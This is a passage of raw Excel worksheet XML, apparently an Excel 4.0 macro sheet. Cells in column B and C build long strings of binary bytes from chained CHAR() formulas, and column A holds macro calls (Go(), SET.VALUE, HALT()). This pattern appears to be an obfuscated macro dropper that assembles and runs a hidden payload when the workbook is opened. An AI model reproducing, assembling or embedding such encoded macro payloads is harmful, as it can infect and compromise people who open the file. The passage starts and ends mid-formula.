14)&amp;CHAR(183)&amp;CHAR(229)&amp;CHAR(191)&amp;CHAR(221)&amp;CHAR(229)&amp;CHAR(140)&amp;CHAR(18)&amp;CHAR(116)&amp;CHAR(222)&amp;CHAR(191)&amp;CHAR(198)&amp;CHAR(237)&amp;CHAR(114)&amp;CHAR(174)&amp;CHAR(160)&amp;CHAR(252)&amp;CHAR(106)&amp;CHAR(65)&amp;CHAR(113)&amp;CHAR(218)&amp;CHAR(129)&amp;CHAR(218)&amp;CHAR(217)&amp;CHAR(167)&amp;CHAR(106)&amp;CHAR(98)&amp;CHAR(222)&amp;CHAR(193)&amp;CHAR(18)&amp;CHAR(4)&amp;CHAR(93)&amp;CHAR(166)&amp;CHAR(15)&amp;CHAR(253)&amp;CHAR(183)&amp;CHAR(157)&amp;CHAR(85)&amp;CHAR(124)&amp;CHAR(214)&amp;CHAR(72)&amp;CHAR(15)&amp;CHAR(246)&amp;CHAR(170)&amp;CHAR(81)&amp;CHAR(247)&amp;CHAR(144)&amp;CHAR(144)&amp;CHAR(45)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(94)&amp;CHAR(84)&amp;CHAR(235)&amp;CHAR(63)&amp;CHAR(176)&amp;CHAR(167)&amp;CHAR(225)&amp;CHAR(78)&amp;CHAR(154)&amp;CHAR(77)&amp;CHAR(234)&amp;CHAR(47)&amp;CHAR(237)&amp;CHAR(5)&amp;CHAR(105)&amp;CHAR(236)&amp;CHAR(68)&amp;CHAR(1)&amp;CHAR(227)&amp;CHAR(148)&amp;CHAR(194)&amp;CHAR(4)&amp;CHAR(188)&amp;CHAR(58)&amp;CHAR(15)&amp;CHAR(161)&amp;CHAR(118)&amp;CHAR(222)&amp;CHAR(254)&amp;CHAR(41)&amp;CHAR(183)&amp;CHAR(200)&amp;CHAR(205)&amp;CHAR(40)&amp;CHAR(32)&amp;CHAR(178)&amp;CHAR(26)&amp;CHAR(37)&amp;CHAR(2)&amp;CHAR(194)&amp;CHAR(237)&amp;CHAR(251)&amp;CHAR(229)&amp;CHAR(29)&amp;CHAR(15)&amp;CHAR(223)&amp;CHAR(102)&amp;CHAR(215)&amp;CHAR(56)&amp;CHAR(152)&amp;CHAR(254)&amp;CHAR(104)&amp;CHAR(163)&amp;CHAR(134)&amp;CHAR(92)&amp;CHAR(41)&amp;CHAR(125)&amp;CHAR(74)&amp;CHAR(72)&amp;CHAR(82)&amp;CHAR(155)&amp;CHAR(106)&amp;CHAR(164)&amp;CHAR(222)&amp;CHAR(175)&amp;CHAR(19)&amp;CHAR(60)&amp;CHAR(188)&amp;CHAR(108)&amp;CHAR(236)&amp;CHAR(2)&amp;CHAR(84)&amp;CHAR(177)&amp;CHAR(40)&amp;CHAR(48)&amp;CHAR(210)&amp;CHAR(157)&amp;CHAR(178)&amp;CHAR(255)&amp;CHAR(22)</f>
        <v>)ÒéM_x0013_·×Fß¾œ*^û_x0007_%_x0002_r&gt;_x0005_ÑW£$Qµe“Gïí¾"¥_x0002_,
õ¬uÖ²L?_x000C_âðý†½_x0006_€«Ž×š*Œ¸Œ%©_x000F_ß‡‹Y_x0019_ºŸ½Ò30+¹³²5ñÞ$—÷4¥_x0008_pÐ„°ôç•S-xF	¯_x000E_ø…‰¾GÙ?_x0007_’
†_x0015_Ú÷/ÀQ·5ÿOºr·å¿ÝåŒ_x0012_tÞ¿Æír® üjAqÚÚÙ§jbÞÁ_x0012__x0004_]¦_x000F_ý·U|ÖH_x000F_öªQ÷-_x0006_ý^Të?°§áNšMê/í_x0005_iìD_x0001_ã”Â_x0004_¼:_x000F_¡vÞþ)·ÈÍ( ²_x001A_%_x0002_Âíûå_x001D__x000F_ßf×8˜þh£†\)}JHR›j¤Þ¯_x0013_&lt;¼lì_x0002_T±(0Ò²ÿ_x0016_</v>
      </c>
      <c r="C38" t="str">
        <f>CHAR(158)&amp;CHAR(67)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(158)&amp;CHAR(75)</f>
        <v>žC_x0015_€ÓÏ&gt;±žK</v>
      </c>
    </row>
    <row r="39" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A39" t="e">
        <f>Go()</f>
        <v>#NAME?</v>
      </c>
      <c r="B39" t="str">
        <f>CHAR(100)&amp;CHAR(100)&amp;CHAR(239)&amp;CHAR(60)&amp;CHAR(191)&amp;CHAR(167)&amp;CHAR(159)&amp;CHAR(51)&amp;CHAR(221)&amp;CHAR(212)&amp;CHAR(209)&amp;CHAR(107)&amp;CHAR(199)&amp;CHAR(124)&amp;CHAR(50)&amp;CHAR(166)&amp;CHAR(209)&amp;CHAR(28)&amp;CHAR(138)&amp;CHAR(197)&amp;CHAR(43)&amp;CHAR(209)&amp;CHAR(116)&amp;CHAR(72)&amp;CHAR(11)&amp;CHAR(56)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(112)&amp;CHAR(231)&amp;CHAR(224)&amp;CHAR(146)&amp;CHAR(225)&amp;CHAR(229)&amp;CHAR(206)&amp;CHAR(210)&amp;CHAR(25)&amp;CHAR(243)&amp;CHAR(241)&amp;CHAR(225)&amp;CHAR(95)&amp;CHAR(231)&amp;CHAR(123)&amp;CHAR(51)&amp;CHAR(136)&amp;CHAR(78)&amp;CHAR(239)&amp;CHAR(201)&amp;CHAR(144)&amp;CHAR(79)&amp;CHAR(37)&amp;CHAR(135)&amp;CHAR(91)&amp;CHAR(38)&amp;CHAR(24)&amp;CHAR(78)&amp;CHAR(161)&amp;CHAR(47)&amp;CHAR(92)&amp;CHAR(252)&amp;CHAR(172)&amp;CHAR(211)&amp;CHAR(10)&amp;CHAR(61)&amp;CHAR(106)&amp;CHAR(58)&amp;CHAR(103)&amp;CHAR(169)&amp;CHAR(160)&amp;CHAR(149)&amp;CHAR(251)&amp;CHAR(194)&amp;CHAR(130)&amp;CHAR(68)&amp;CHAR(34)&amp;CHAR(136)&amp;CHAR(7)&amp;CHAR(239)&amp;CHAR(241)&amp;CHAR(154)&amp;CHAR(189)&amp;CHAR(53)&amp;CHAR(52)&amp;CHAR(57)&amp;CHAR(244)&amp;CHAR(50)&amp;CHAR(17)&amp;CHAR(190)&amp;CHAR(147)&amp;CHAR(114)&amp;CHAR(210)&amp;CHAR(246)&amp;CHAR(180)&amp;CHAR(17)&amp;CHAR(230)&amp;CHAR(71)&amp;CHAR(92)&amp;CHAR(105)&amp;CHAR(245)&amp;CHAR(106)&amp;CHAR(179)&amp;CHAR(94)&amp;CHAR(189)&amp;CHAR(164)&amp;CHAR(95)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(177)&amp;CHAR(28)&amp;CHAR(211)&amp;CHAR(193)&amp;CHAR(7)&amp;CHAR(80)&amp;CHAR(68)&amp;CHAR(182)&amp;CHAR(182)&amp;CHAR(223)&amp;CHAR(32)&amp;CHAR(35)&amp;CHAR(116)&amp;CHAR(27)&amp;CHAR(206)&amp;CHAR(173)&amp;CHAR(46)&amp;CHAR(186)&amp;CHAR(158)&amp;CHAR(83)&amp;CHAR(58)&amp;CHAR(252)&amp;CHAR(57)&amp;CHAR(141)&amp;CHAR(240)&amp;CHAR(35)&amp;CHAR(174)&amp;CHAR(55)&amp;CHAR(39)&amp;CHAR(193)&amp;CHAR(14)&amp;CHAR(144)&amp;CHAR(49)&amp;CHAR(100)&amp;CHAR(104)&amp;CHAR(20)&amp;CHAR(33)&amp;CHAR(164)&amp;CHAR(242)&amp;CHAR(250)&amp;CHAR(88)&amp;CHAR(161)&amp;CHAR(210)&amp;CHAR(36)&amp;CHAR(3)&amp;CHAR(231)&amp;CHAR(153)&amp;CHAR(55)&amp;CHAR(156)&amp;CHAR(167)&amp;CHAR(47)&amp;CHAR(105)&amp;CHAR(219)&amp;CHAR(187)&amp;CHAR(48)&amp;CHAR(254)&amp;CHAR(233)&amp;CHAR(80)&amp;CHAR(133)&amp;CHAR(24)&amp;CHAR(144)&amp;CHAR(226)&amp;CHAR(241)&amp;CHAR(194)&amp;CHAR(148)&amp;CHAR(83)&amp;CHAR(78)&amp;CHAR(227)&amp;CHAR(118)&amp;CHAR(212)&amp;CHAR(86)&amp;CHAR(135)&amp;CHAR(189)&amp;CHAR(194)&amp;CHAR(148)&amp;CHAR(49)&amp;CHAR(166)&amp;CHAR(200)&amp;CHAR(177)&amp;CHAR(20)&amp;CHAR(45)&amp;CHAR(232)&amp;CHAR(115)&amp;CHAR(25)&amp;CHAR(168)&amp;CHAR(25)&amp;CHAR(196)&amp;CHAR(70)&amp;CHAR(179)&amp;CHAR(94)&amp;CHAR(155)&amp;CHAR(133)&amp;CHAR(127)&amp;CHAR(232)&amp;CHAR(130)&amp;CHAR(110)&amp;CHAR(238)&amp;CHAR(113)&amp;CHAR(46)&amp;CHAR(239)&amp;CHAR(125)&amp;CHAR(100)&amp;CHAR(216)&amp;CHAR(44)&amp;CHAR(253)&amp;CHAR(246)&amp;CHAR(155)&amp;CHAR(99)&amp;CHAR(119)&amp;CHAR(168)&amp;CHAR(87)&amp;CHAR(109)&amp;CHAR(163)&amp;CHAR(149)&amp;CHAR(144)&amp;CHAR(86)&amp;CHAR(71)&amp;CHAR(105)&amp;CHAR(250)&amp;CHAR(161)&amp;CHAR(223)&amp;CHAR(146)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(10)&amp;CHAR(196)&amp;CHAR(199)&amp;CHAR(83)&amp;CHAR(221)&amp;CHAR(48)&amp;CHAR(148)&amp;CHAR(32)&amp;CHAR(74)&amp;CHAR(191)&amp;CHAR(247)&amp;CHAR(90)&amp;CHAR(176)&amp;CHAR(211)&amp;CHAR(181)&amp;CHAR(199)&amp;CHAR(176)&amp;CHAR(78)&amp;CHAR(52)&amp;CHAR(194)&amp;CHAR(24)&amp;CHAR(86)&amp;CHAR(217)&amp;CHAR(96)</f>
        <v>ddï&lt;¿§Ÿ3ÝÔÑkÇ|2¦Ñ_x001C_ŠÅ+ÑtH_x000B_8®úpçà’áåÎÒ_x0019_óñá_ç{3ˆNïÉO%‡[&amp;_x0018_N¡/\ü¬Ó
=j:g© •ûÂ‚D"ˆ_x0007_ïñš½549ô2_x0011_¾“rÒö´_x0011_æG\iõj³^½¤_}%±_x001C_ÓÁ_x0007_PD¶¶ß #t_x001B_Î­.ºžS:ü9ð#®7'Á_x000E_1dh_x0014_!¤òúX¡Ò$_x0003_ç™7œ§/iÛ»0þéP…_x0018_âñÂ”SNãvÔV‡½Â”1¦È±_x0014_-ès_x0019_¨_x0019_ÄF³^›…è‚nîq.ï}dØ,ýö›cw¨Wm£•VGiú¡ß’ê‘
ÄÇSÝ0” J¿÷Z°ÓµÇ°N4Â_x0018_VÙ`</v>
      </c>
      <c r="C39" t="str">
        <f>CHAR(231)&amp;CHAR(237)&amp;CHAR(178)&amp;CHAR(70)&amp;CHAR(206)&amp;CHAR(249)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(120)&amp;CHAR(163)</f>
        <v>çí²FÎù[Ýx£</v>
      </c>
    </row>
    <row r="40" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A40" t="b">
        <f>SET.VALUE(A22,0)</f>
        <v>0</v>
      </c>
      <c r="B40" t="str">
        <f>CHAR(79)&amp;CHAR(229)&amp;CHAR(227)&amp;CHAR(64)&amp;CHAR(50)&amp;CHAR(43)&amp;CHAR(99)&amp;CHAR(132)&amp;CHAR(242)&amp;CHAR(47)&amp;CHAR(162)&amp;CHAR(155)&amp;CHAR(161)&amp;CHAR(19)&amp;CHAR(145)&amp;CHAR(93)&amp;CHAR(119)&amp;CHAR(193)&amp;CHAR(196)&amp;CHAR(103)&amp;CHAR(245)&amp;CHAR(58)&amp;CHAR(157)&amp;CHAR(41)&amp;CHAR(128)&amp;CHAR(82)&amp;CHAR(35)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(238)&amp;CHAR(205)&amp;CHAR(56)&amp;CHAR(187)&amp;CHAR(140)&amp;CHAR(9)&amp;CHAR(118)&amp;CHAR(172)&amp;CHAR(217)&amp;CHAR(88)&amp;CHAR(189)&amp;CHAR(137)&amp;CHAR(222)&amp;CHAR(3)&amp;CHAR(192)&amp;CHAR(21)&amp;CHAR(225)&amp;CHAR(173)&amp;CHAR(71)&amp;CHAR(245)&amp;CHAR(243)&amp;CHAR(107)&amp;CHAR(123)&amp;CHAR(203)&amp;CHAR(192)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(169)&amp;CHAR(88)&amp;CHAR(3)&amp;CHAR(185)&amp;CHAR(216)&amp;CHAR(239)&amp;CHAR(99)&amp;CHAR(114)&amp;CHAR(204)&amp;CHAR(47)&amp;CHAR(127)&amp;CHAR(79)&amp;CHAR(235)&amp;CHAR(220)&amp;CHAR(151)&amp;CHAR(224)&amp;CHAR(245)&amp;CHAR(249)&amp;CHAR(19)&amp;CHAR(222)&amp;CHAR(88)&amp;CHAR(80)&amp;CHAR(70)&amp;CHAR(180)&amp;CHAR(239)&amp;CHAR(118)&amp;CHAR(23)&amp;CHAR(179)&amp;CHAR(15)&amp;CHAR(226)&amp;CHAR(46)&amp;CHAR(198)&amp;CHAR(13)&amp;CHAR(236)&amp;CHAR(254)&amp;CHAR(109)&amp;CHAR(242)&amp;CHAR(221)&amp;CHAR(111)&amp;CHAR(143)&amp;CHAR(199)&amp;CHAR(207)&amp;CHAR(50)&amp;CHAR(110)&amp;CHAR(125)&amp;CHAR(219)&amp;CHAR(138)&amp;CHAR(145)&amp;CHAR(146)&amp;CHAR(20)&amp;CHAR(233)&amp;CHAR(126)&amp;CHAR(170)&amp;CHAR(169)&amp;CHAR(201)&amp;CHAR(170)&amp;CHAR(251)&amp;CHAR(88)&amp;CHAR(127)&amp;CHAR(154)&amp;CHAR(223)&amp;CHAR(32)&amp;CHAR(49)&amp;CHAR(58)&amp;CHAR(174)&amp;CHAR(97)&amp;CHAR(69)&amp;CHAR(50)&amp;CHAR(248)&amp;CHAR(10)&amp;CHAR(184)&amp;CHAR(236)&amp;CHAR(68)&amp;CHAR(65)&amp;CHAR(149)&amp;CHAR(53)&amp;CHAR(212)&amp;CHAR(55)&amp;CHAR(229)&amp;CHAR(95)&amp;CHAR(222)&amp;CHAR(170)&amp;CHAR(44)&amp;CHAR(230)&amp;CHAR(214)&amp;CHAR(123)&amp;CHAR(198)&amp;CHAR(18)&amp;CHAR(229)&amp;CHAR(98)&amp;CHAR(152)&amp;CHAR(157)&amp;CHAR(65)&amp;CHAR(65)&amp;CHAR(78)&amp;CHAR(20)&amp;CHAR(243)&amp;CHAR(16)&amp;CHAR(123)&amp;CHAR(210)&amp;CHAR(219)&amp;CHAR(188)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(52)&amp;CHAR(229)&amp;CHAR(132)&amp;CHAR(21)&amp;CHAR(75)&amp;CHAR(167)&amp;CHAR(43)&amp;CHAR(206)&amp;CHAR(12)&amp;CHAR(22)&amp;CHAR(176)&amp;CHAR(174)&amp;CHAR(225)&amp;CHAR(17)&amp;CHAR(26)&amp;CHAR(61)&amp;CHAR(75)&amp;CHAR(71)&amp;CHAR(66)&amp;CHAR(131)&amp;CHAR(246)&amp;CHAR(235)&amp;CHAR(131)&amp;CHAR(97)&amp;CHAR(97)&amp;CHAR(37)&amp;CHAR(194)&amp;CHAR(90)&amp;CHAR(21)&amp;CHAR(171)&amp;CHAR(114)&amp;CHAR(38)&amp;CHAR(206)&amp;CHAR(10)&amp;CHAR(63)&amp;CHAR(20)&amp;CHAR(252)&amp;CHAR(92)&amp;CHAR(104)&amp;CHAR(34)&amp;CHAR(59)&amp;CHAR(158)&amp;CHAR(90)&amp;CHAR(191)&amp;CHAR(49)&amp;CHAR(149)&amp;CHAR(129)&amp;CHAR(169)&amp;CHAR(219)&amp;CHAR(46)&amp;CHAR(174)&amp;CHAR(52)&amp;CHAR(121)&amp;CHAR(215)&amp;CHAR(231)&amp;CHAR(194)&amp;CHAR(38)&amp;CHAR(80)&amp;CHAR(18)&amp;CHAR(97)&amp;CHAR(87)&amp;CHAR(174)&amp;CHAR(206)&amp;CHAR(103)&amp;CHAR(52)&amp;CHAR(12)&amp;CHAR(234)&amp;CHAR(32)&amp;CHAR(44)&amp;CHAR(52)&amp;CHAR(47)&amp;CHAR(174)&amp;CHAR(124)&amp;CHAR(39)&amp;CHAR(69)&amp;CHAR(235)&amp;CHAR(59)&amp;CHAR(198)&amp;CHAR(109)&amp;CHAR(224)&amp;CHAR(223)&amp;CHAR(199)&amp;CHAR(36)&amp;CHAR(36)&amp;CHAR(209)&amp;CHAR(237)&amp;CHAR(181)&amp;CHAR(131)&amp;CHAR(10)&amp;CHAR(246)&amp;CHAR(15)&amp;CHAR(48)&amp;CHAR(201)&amp;CHAR(162)&amp;CHAR(17)</f>
        <v>Oåã@2+c„ò/¢›¡_x0013_‘]wÁÄgõ:)€R#Ž»îÍ8»Œ	v¬ÙX½‰Þ_x0003_À_x0015_á­Gõók{ËÀô0©X_x0003_¹ØïcrÌ/OëÜ—àõù_x0013_ÞXPF´ïv_x0017_³_x000F_â.Æ_x000D_ìþmòÝoÇÏ2n}ÛŠ‘’_x0014_é~ª©ÉªûXšß 1:®aE2ø
¸ìDA•5Ô7å_Þª,æÖ{Æ_x0012_åb˜AAN_x0014_ó_x0010_{ÒÛ¼_x0005_‰4å„_x0015_K§+Î_x000C__x0016_°®á_x0011__x001A_=KGBƒöëƒaa%ÂZ_x0015_«r&amp;Î
?_x0014_ü\h";žZ¿1•©Û.®4y×çÂ&amp;P_x0012_aW®Îg4_x000C_ê ,4/®|'Eë;ÆmàßÇ$$Ñíµƒ
ö_x000F_0É¢_x0011_</v>
      </c>
      <c r="C40" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(118)&amp;CHAR(60)&amp;CHAR(219)&amp;CHAR(61)&amp;CHAR(36)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(39)</f>
        <v>ûÏv&lt;Û=$¥û'</v>
      </c>
    </row>
    <row r="41" spans="1:3" x14ac:dyDescent="0.25">
      <c r="A41" t="b">
        <f>HALT()</f>
        <v>0</v>
      </c>
      <c r="B41" t="str">
        <f>CHAR(53)&amp;CHAR(185)&amp;CHAR(172)&amp;CHAR(223)&amp;CHAR(246)&amp;CHAR(166)&amp;CHAR(31)&amp;CHAR(218)&amp;CHAR(9)&amp;CHAR(160)&amp;CHAR(207)&amp;CHAR(146)&amp;CHAR(72)&amp;CHAR(176)&amp;CHAR(240)&amp;CHAR(132)&amp;CHAR(98)&amp;CHAR(98)&amp;CHAR(139)&amp;CHAR(171)&amp;CHAR(21)&amp;CHAR(51)&amp;CHAR(95)&amp;CHAR(238)&amp;CHAR(55)&amp;CHAR(122)&amp;CHAR(160)&amp;CHAR(122)&amp;CHAR(242)&amp;CHAR(213)&amp;CHAR(82)&amp;CHAR(156)&amp;CHAR(55)&amp;CHAR(89)&amp;CHAR(110)&amp;CHAR(140)&amp;CHAR(16)&amp;CHAR(124)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(68)&amp;CHAR(98)&amp;CHAR(208)&amp;CHAR(97)&amp;CHAR(187)&amp;CHAR(32)&amp;CHAR(244)&amp;CHAR(213)&amp;CHAR(36)&amp;CHAR(49)&amp;CHAR(45)&amp;CHAR(69)&amp;CHAR(242)&amp;CHAR(144)&amp;CHAR(43)&amp;CHAR(80)&amp;CHAR(136)&amp;CHAR(114)&amp;CHAR(133)&amp;CHAR(62)&amp;CHAR(113)&amp;CHAR(182)&amp;CHAR(204)&amp;CHAR(208)&amp;CHAR(12)&amp;CHAR(89)&amp;CHAR(200)&amp;CHAR(78)&amp;CHAR(185)&amp;CHAR(203)&amp;CHAR(160)&amp;CHAR(177)&amp;CHAR(218)&amp;CHAR(160)&amp;CHAR(113)&amp;CHAR(32)&amp;CHAR(123)&amp;CHAR(54)&amp;CHAR(24)&amp;CHAR(70)&amp;CHAR(217)&amp;CHAR(190)&amp;CHAR(110)&amp;CHAR(104)&amp;CHAR(221)&amp;CHAR(150)&amp;CHAR(74)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(196)&amp;CHAR(121)&amp;CHAR(202)&amp;CHAR(102)&amp;CHAR(161)&amp;CHAR(146)&amp;CHAR(121)&amp;CHAR(152)&amp;CHAR(24)&amp;CHAR(203)&amp;CHAR(240)&amp;CHAR(140)&amp;CHAR(221)&amp;CHAR(122)&amp;CHAR(38)&amp;CHAR(50)&amp;CHAR(182)&amp;CHAR(94)&amp;CHAR(169)&amp;CHAR(248)&amp;CHAR(66)&amp;CHAR(217)&amp;CHAR(26)&amp;CHAR(76)&amp;CHAR(228)&amp;CHAR(225)&amp;CHAR(13)&amp;CHAR(3)&amp;CHAR(88)&amp;CHAR(253)&amp;CHAR(59)&amp;CHAR(220)&amp;CHAR(147)&amp;CHAR(42)&amp;CHAR(232)&amp;CHAR(177)&amp;CHAR(147)&amp;CHAR(92)&amp;CHAR(235)&amp;CHAR(34)&amp;CHAR(78)&amp;CHAR(98)&amp;CHAR(226)&amp;CHAR(164)&amp;CHAR(187)&amp;CHAR(121)&amp;CHAR(51)&amp;CHAR(250)&amp;CHAR(193)&amp;CHAR(28)&amp;CHAR(178)&amp;CHAR(255)&amp;CHAR(130)&amp;CHAR(23)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(201)&amp;CHAR(101)&amp;CHAR(175)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(189)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(192)&amp;CHAR(74)&amp;CHAR(73)&amp;CHAR(115)&amp;CHAR(136)&amp;CHAR(210)&amp;CHAR(144)&amp;CHAR(158)&amp;CHAR(241)&amp;CHAR(170)&amp;CHAR(15)&amp;CHAR(113)&amp;CHAR(147)&amp;CHAR(222)&amp;CHAR(150)&amp;CHAR(160)&amp;CHAR(118)&amp;CHAR(116)&amp;CHAR(183)&amp;CHAR(20)&amp;CHAR(23)&amp;CHAR(45)&amp;CHAR(59)&amp;CHAR(143)&amp;CHAR(143)&amp;CHAR(215)&amp;CHAR(240)&amp;CHAR(210)&amp;CHAR(61)&amp;CHAR(224)&amp;CHAR(136)&amp;CHAR(19)&amp;CHAR(15)&amp;CHAR(81)&amp;CHAR(195)&amp;CHAR(14)&amp;CHAR(81)&amp;CHAR(127)&amp;CHAR(116)&amp;CHAR(68)&amp;CHAR(174)&amp;CHAR(90)&amp;CHAR(9)&amp;CHAR(40)&amp;CHAR(151)&amp;CHAR(100)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(205)&amp;CHAR(237)&amp;CHAR(25)&amp;CHAR(118)&amp;CHAR(80)&amp;CHAR(79)&amp;CHAR(69)&amp;CHAR(237)&amp;CHAR(35)&amp;CHAR(36)&amp;CHAR(226)&amp;CHAR(206)&amp;CHAR(254)&amp;CHAR(224)&amp;CHAR(102)&amp;CHAR(223)&amp;CHAR(110)&amp;CHAR(255)&amp;CHAR(148)&amp;CHAR(93)&amp;CHAR(178)&amp;CHAR(163)&amp;CHAR(133)&amp;CHAR(84)&amp;CHAR(56)&amp;CHAR(77)&amp;CHAR(191)&amp;CHAR(9)&amp;CHAR(128)&amp;CHAR(4)&amp;CHAR(161)&amp;CHAR(149)&amp;CHAR(178)&amp;CHAR(59)&amp;CHAR(218)&amp;CHAR(61)&amp;CHAR(236)&amp;CHAR(62)&amp;CHAR(162)&amp;CHAR(210)&amp;CHAR(174)&amp;CHAR(60)&amp;CHAR(60)&amp;CHAR(245)&amp;CHAR(144)&amp;CHAR(67)&amp;CHAR(29)&amp;CHAR(205)&amp;CHAR(63)&amp;CHAR(217)&amp;CHAR(241)&amp;CHAR(125)&amp;CHAR(185)&amp;CHAR(6)</f>
        <v>5¹¬ßö¦_x001F_Ú	 Ï’H°ð„bb‹«_x0015_3_î7z zòÕRœ7YnŒ_x0010_|	»DbÐa» ôÕ$1-Eò+Pˆr…&gt;q¶ÌÐ_x000C_YÈN¹Ë ±Ú q {6_x0018_FÙ¾nhÝ–J-_x0016_ÄyÊf¡’y˜_x0018_ËðŒÝz&amp;2¶^©øBÙ_x001A_Läá_x000D__x0003_Xý;Ü“*è±“\ë"Nbâ¤»y3úÁ_x001C_²ÿ‚_x0017__x000D_€Ée¯_x0005__x000B_½
9ÀJIsˆÒžñª_x000F_q“Þ– vt·_x0014__x0017_-;×ðÒ=àˆ_x0013__x000F_QÃ_x000E_QtD®Z	(—dG!Íí_x0019_vPOEí#$âÎþàfßnÿ”]²£…T8M¿	€_x0004_¡•²;Ú=ì&gt;¢Ò®&lt;&lt;õC_x001D_Í?Ùñ}¹_x0006_</v>
      </c>
      <c r="C41" t="str">
        <f>CHAR(140)&amp;CHAR(178)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(68)&amp;CHAR(233)&amp;CHAR(112)&amp;CHAR(203)&amp;CHAR(27)&amp;CHAR(153)</f>
        <v>Œ²ÖÈDépË_x001B_™</v>
      </c>
    </row>
    <row r="42" spans="1:3" x14ac:dyDescent="0.25">
      <c r="B42" t="str">
        <f>CHAR(210)&amp;CHAR(202)&amp;CHAR(87)&amp;CHAR(222)&amp;CHAR(167)&amp;CHAR(158)&amp;CHAR(27)&amp;CHAR(241)&amp;CHAR(239)&amp;CHAR(13)&amp;CHAR(30)&amp;CHAR(243)&amp;CHAR(180)&amp;CHAR(219)&amp;CHAR(220)&amp;CHAR(108)&amp;CHAR(25)&amp;CHAR(160)&amp;CHAR(44)&amp;CHAR(88)&amp;CHAR(189)&amp;CHAR(187)&amp;CHAR(181)&amp;CHAR(17)&amp;CHAR(162)&amp;CHAR(121)&amp;CHAR(72)&amp;CHAR(220)&amp;CHAR(63)&amp;CHAR(234)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(42)&amp;CHAR(230)&amp;CHAR(14)&amp;CHAR(95)&amp;CHAR(110)&amp;CHAR(221)&amp;CHAR(42)&amp;CHAR(160)&amp;CHAR(241)&amp;CHAR(162)&amp;CHAR(175)&amp;CHAR(186)&amp;CHAR(164)&amp;CHAR(61)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(250)&amp;CHAR(184)&amp;CHAR(241)&amp;CHAR(185)&amp;CHAR(43)&amp;CHAR(140)&amp;CHAR(196)&amp;CHAR(85)&amp;CHAR(26)&amp;CHAR(68)&amp;CHAR(253)&amp;CHAR(250)&amp;CHAR(237)&amp;CHAR(234)&amp;CHAR(19)&amp;CHAR(119)&amp;CHAR(134)&amp;CHAR(19)&amp;CHAR(220)&amp;CHAR(191)&amp;CHAR(156)&amp;CHAR(79)&amp;CHAR(197)&amp;CHAR(189)&amp;CHAR(255)&amp;CHAR(231)&amp;CHAR(181)&amp;CHAR(51)&amp;CHAR(71)&amp;CHAR(148)&amp;CHAR(79)&amp;CHAR(231)&amp;CHAR(79)&amp;CHAR(157)&amp;CHAR(2)&amp;CHAR(251)&amp;CHAR(233)&amp;CHAR(222)&amp;CHAR(27)&amp;CHAR(215)&amp;CHAR(8)&amp;CHAR(210)&amp;CHAR(82)&amp;CHAR(182)&amp;CHAR(134)&amp;CHAR(16)&amp;CHAR(207)&amp;CHAR(101)&amp;CHAR(94)&amp;CHAR(22)&amp;CHAR(152)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(160)&amp;CHAR(218)&amp;CHAR(66)&amp;CHAR(12)&amp;CHAR(43)&amp;CHAR(187)&amp;CHAR(89)&amp;CHAR(106)&amp;CHAR(40)&amp;CHAR(229)&amp;CHAR(25)&amp;CHAR(201)&amp;CHAR(226)&amp;CHAR(180)&amp;CHAR(198)&amp;CHAR(152)&amp;CHAR(164)&amp;CHAR(65)&amp;CHAR(102)&amp;CHAR(232)&amp;CHAR(239)&amp;CHAR(219)&amp;CHAR(187)&amp;CHAR(227)&amp;CHAR(142)&amp;CHAR(245)&amp;CHAR(45)&amp;CHAR(197)&amp;CHAR(131)&amp;CHAR(11)&amp;CHAR(85)&amp;CHAR(189)&amp;CHAR(26)&amp;CHAR(69)&amp;CHAR(210)&amp;CHAR(3)&amp;CHAR(56)&amp;CHAR(45)&amp;CHAR(125)&amp;CHAR(8)&amp;CHAR(151)&amp;CHAR(141)&amp;CHAR(150)&amp;CHAR(78)&amp;CHAR(21)&amp;CHAR(174)&amp;CHAR(45)&amp;CHAR(128)&amp;CHAR(101)&amp;CHAR(66)&amp;CHAR(155)&amp;CHAR(35)&amp;CHAR(240)&amp;CHAR(184)&amp;CHAR(201)&amp;CHAR(94)&amp;CHAR(231)&amp;CHAR(240)&amp;CHAR(75)&amp;CHAR(209)&amp;CHAR(215)&amp;CHAR(138)&amp;CHAR(237)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(96)&amp;CHAR(99)&amp;CHAR(64)&amp;CHAR(60)&amp;CHAR(158)&amp;CHAR(214)&amp;CHAR(211)&amp;CHAR(99)&amp;CHAR(70)&amp;CHAR(134)&amp;CHAR(54)&amp;CHAR(5)&amp;CHAR(74)&amp;CHAR(90)&amp;CHAR(10)&amp;CHAR(33)&amp;CHAR(9)&amp;CHAR(106)&amp;CHAR(173)&amp;CHAR(168)&amp;CHAR(244)&amp;CHAR(201)&amp;CHAR(177)&amp;CHAR(4)&amp;CHAR(38)&amp;CHAR(143)&amp;CHAR(120)&amp;CHAR(82)&amp;CHAR(174)&amp;CHAR(216)&amp;CHAR(188)&amp;CHAR(144)&amp;CHAR(94)&amp;CHAR(2)&amp;CHAR(26)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(127)&amp;CHAR(247)&amp;CHAR(102)&amp;CHAR(159)&amp;CHAR(85)&amp;CHAR(87)&amp;CHAR(67)&amp;CHAR(169)&amp;CHAR(85)&amp